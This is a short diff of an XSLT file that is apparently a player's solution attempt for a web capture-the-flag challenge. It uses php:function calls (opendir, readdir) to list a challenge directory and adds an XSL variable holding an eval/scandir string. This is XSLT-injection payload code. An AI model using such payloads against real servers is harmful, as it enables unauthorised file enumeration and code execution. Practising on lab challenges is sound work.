@@ -4,5 +4,13 @@
 <xsl:value-of select="php:function('opendir', '/challenge/web-serveur/ch50/')"/>
 <xsl:value-of select="php:function('readdir')"/>  
 
+<xsl:variable name="eval">
+        eval("var_dump(scandir('.'));")
+</xsl:variable>
+  <xsl:value-of select="$eval"/> 
+
+  
+  
+
 </body>
 </html> 
